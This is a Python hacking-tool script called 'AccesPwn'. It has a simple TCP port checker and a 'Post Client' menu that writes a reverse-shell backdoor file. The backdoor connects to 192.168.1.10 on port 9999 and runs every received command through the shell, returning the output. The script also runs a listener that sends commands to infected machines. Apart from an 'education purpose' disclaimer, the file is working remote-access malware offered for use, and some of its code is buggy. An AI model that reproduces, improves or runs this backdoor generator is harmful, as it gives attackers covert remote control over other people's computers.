#!/bin/bash/env python3
import os
import sys
import socket
import time 
import pyfiglet
name = pyfiglet.figlet_format("AccesPwn")
print(name+          'developped by msfcode' )
print("")
print("")
print("")
print("")
print("                                             Coded By @msfcode                                 |====================")
print("                                             exploits, Coffee                                  |   for education   |")
print("                                                KEEP-CALM                                      | Ask a copyright(R)|")
print("                                             They Watch YOU !!                                 |                   |")
print("                                        \u001b[36mhttps://github.com/msfcode                   ")
print("")
print("                                                                                    \u001b[32mAttention:I'm Not responsable of your acts")
print("                                                                                                 (Education Purpose)          ")
print("")
print("")
print("                                                \u001b[31mAttacks ")
print("")
print("                                \u001b[37m1-Port Scanning          2-Post Client")
print("")
number = int(input("Type the attack number>>")) 
if number == 1:
  print("")
  print("")
  print("                 \u001b[31mPort Scanners are an important tool when you want to investigate any remote or")
  print("                local network for security considerations. Used by programmers and network administrators,")    
  print("                these port scanners are used to mainly know what ports are being used by what applications,") 
  print("                     so you can identify malicious programs right away.")
  print("")
  print("")
  socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  host = input("\u001b[32mType The Ip address>>")
  port = int(input("Type The Port>>"))
  if socket.connect_ex((host, port)):
   print("\u001b[31mThe Port is closed")
  else: 
   print("\u001b[33mThe Port is opened")
if number == 2: 
   print("                                                      \u001b[33m/--------------------\                                                                                 ")
   print("                                                     /     (>)     (<)      \                                                              ")
   print("                                                    /         .   .          \                                                            ")
   print("                                                   /                          \                                                           ")
   print("                                                  /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\                                                                                     ")
   print("                                                 |      \u001b[36mhacking is an art       \u001b[33m|                                          ")
   print("                                                 \u001b[33m\         \u001b[36mis a life            \u001b[33m/                                            ")
   print("                                                  \u001b[33m\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/                                                                     ")
   print("                                                                                                                        ")
   print("                                                        Author :  @msfcode                                                             ")
   print("")
   print("")
   print("")
   print("")
   print("                                                      [1] creat   [2] handler")
   print("")
   print("")
   print("")
   print("")
   number2 = int(input('Type the number>>'))
   if number2 == 1:
    name = input(str("Type Backdoor Name :"))
    backdoor = open(name+'.py', 'w')
    backdoor.write('''import os 
import subprocess
import os
import sys
import socket
host = "192.168.1.10"
port = 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8")) 
        if len(data) > 0: 
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8") 
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str) 
s.close()
''')
    backdoor.close()
    def creat_socket():
       try:
        global host 
        global port
        global s
        host = "192.168.1.10"
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       except:
         print("[!]Sorry their is an error[!]")    


    def s_bind():
       try:
         global host
         global port
         global s
         s.bind((host, port))
         s.listen(1)
       except socket.error as msg:
         print("[!]Their is an error try to fix it[!]")


    def send_commands(conn):
     while True:
        cmd = input("command>>")
        if cmd == 'quit':
            s.close()
            conn.close()
            sys.close()
        if len(str.encode(cmd)) > 0:
         conn.send(str.encode(cmd))
         client_data = str(conn.recv(1024), 'utf-8')    
         print(client_data)     


    def s_accept():
     conn, addr = s.accept()
     send_commands(conn)
     conn.close()

     
    def main():
     creat_socket()
     s_bind()
     s_accept()
    main()
   if number2 == 2:
     def creat_socket():
       try:
        global host 
        global port
        global s
        host = "192.168.1.10"
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       except:
         print("[!]Sorry their is an error[!]")    


     def s_bind():
       try:
         global host
         global port
         global s
         s.bind((host, port))
         s.listen(1)
       except socket.error as msg:
         print("[!]Their is an error try to fix it[!]")


     def send_commands(conn):
      while True:
        cmd = input("command>>")
        if cmd == 'quit':
            s.close()
            conn.close()
            sys.close()
        if len(str.encode(cmd)) > 0:
         conn.send(str.encode(cmd))
         client_data = str(conn.recv(1024), 'utf-8')    
         print(client_data)     


     def s_accept():
      conn, addr = s.accept()
      send_commands(conn)
      conn.close()

     
     def main():
      creat_socket()
      s_bind()
      s_accept()
     main()     